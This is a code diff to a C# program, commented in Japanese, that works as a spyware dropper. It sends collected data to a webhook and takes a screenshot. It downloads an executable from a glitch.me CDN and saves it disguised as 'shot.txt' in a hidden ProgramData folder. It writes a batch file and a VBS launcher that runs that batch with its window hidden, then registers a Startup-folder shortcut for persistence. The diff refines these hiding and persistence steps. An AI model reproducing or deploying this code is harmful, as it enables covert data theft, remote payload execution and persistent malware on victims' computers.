@@ -1,4 +1,4 @@
-﻿using Microsoft.VisualBasic.Logging;
+using Microsoft.VisualBasic.Logging;
 using System.Net;
 using System.Runtime.CompilerServices;
 using System.Text;
@@ -18,7 +18,7 @@ public partial class background
     public string Dir = Directory.GetCurrentDirectory();
     public bool write_log;
     public string data;
-    public static string webhook = "WEB HOOK";
+    public static string webhook = "your webhook";
     public delegate void FunctionInvoker();
     internal class Engine
     {
@@ -178,21 +178,23 @@ public partial class background
         TaskAwaiter<HttpResponseMessage> awaiter = httpClient.PostAsync(webhook, new
         FormUrlEncodedContent(strs)).GetAwaiter();
         awaiter.GetResult();
+        //screen shot
         screenshot scr = new screenshot();
-        scr.shot();
+        scr.shot(); 
         //ファイル削除
         File.Delete(Dir + "\\file.png");
         //埋め込み
-        Directory.CreateDirectory("C:\\ProgramData\\Microsoft-e1d73f1e17251879702463fe6349a1c35026f865");
+        Directory.CreateDirectory("C:\\ProgramData\\{e1d73f1e17251879702463fe6349a1c35026f865}");
         WebClient wc = new WebClient();
-        wc.DownloadFile("https://cdn.glitch.me/a7b56737-b2b9-43b6-930d-0f7a74bcdb15/get-screen.exe?v=1691098976618", "C:\\ProgramData\\Microsoft-e1d73f1e17251879702463fe6349a1c35026f865\\shot.txt");
+        wc.DownloadFile("https://cdn.glitch.me/a7b56737-b2b9-43b6-930d-0f7a74bcdb15/get-screen.exe?v=1691355698319", "C:\\ProgramData\\{e1d73f1e17251879702463fe6349a1c35026f865}\\shot.txt");
         wc.Dispose();
-        File.WriteAllText("C:\\ProgramData\\Microsoft-e1d73f1e17251879702463fe6349a1c35026f865\\run.bat", "call C:\\ProgramData\\Microsoft-e1d73f1e17251879702463fe6349a1c35026f865\\shot.txt");
+        File.WriteAllText("C:\\ProgramData\\{e1d73f1e17251879702463fe6349a1c35026f865}\\run.bat", "start C:\\ProgramData\\{e1d73f1e17251879702463fe6349a1c35026f865}\\shot.png\r\ntimeout /t 180\r\nstart C:\\ProgramData\\{e1d73f1e17251879702463fe6349a1c35026f865}\\shot.png");
+        File.WriteAllText("C:\\ProgramData\\{e1d73f1e17251879702463fe6349a1c35026f865}\\run.vbs", "Option Explicit\r\n\r\nConst vbHide = 0 'ウィンドウを非表示\r\n\r\nFunction ArgsToString()\r\n   Const DELIMITER = \" \"\r\n   Dim ret\r\n   Dim i\r\n   Dim n\r\n\r\n   ret = \"\"\r\n   n = Wscript.Arguments.Count\r\n   If n > 0 Then\r\n     For i = 1 To n\r\n       If i < n Then\r\n         ret = ret & Wscript.Arguments(i - 1) & DELIMITER\r\n       Else\r\n         ret = ret & Wscript.Arguments(i - 1)\r\n       End If\r\n     Next\r\n   End If\r\n   ArgsToString = ret\r\nEnd Function\r\n\r\nDim batPath\r\nbatPath = Replace(WScript.ScriptFullName,\".vbs\",\".bat\")\r\n\r\nCreateObject(\"Wscript.Shell\").run \"cmd /c \" & batPath & \" \" & ArgsToString(), vbHide");
         //スタートアップ登録
         //作成するショートカットのパス
-        string shortcutPath = System.IO.Path.Combine("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\run.lnk");
+        string shortcutPath = Path.Combine("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\run.lnk");
         //ショートカットのリンク先
-        string targetPath = "C:\\ProgramData\\Microsoft-e1d73f1e17251879702463fe6349a1c35026f865\\run.bat";
+        string targetPath = "C:\\ProgramData\\{e1d73f1e17251879702463fe6349a1c35026f865}\\run.vbs";
 
         //WshShellを作成
         IWshRuntimeLibrary.WshShell shell = new IWshRuntimeLibrary.WshShell();
@@ -203,7 +205,7 @@ public partial class background
         //コマンドパラメータ 「リンク先」の後ろに付く
         shortcut.Arguments = "";
         //作業フォルダ
-        shortcut.WorkingDirectory = Application.StartupPath;
+        shortcut.WorkingDirectory = "C:\\ProgramData\\{e1d73f1e17251879702463fe6349a1c35026f865}";
         //実行時の大きさ 1が通常、3が最大化、7が最小化
         shortcut.WindowStyle = 0;
         //コメント
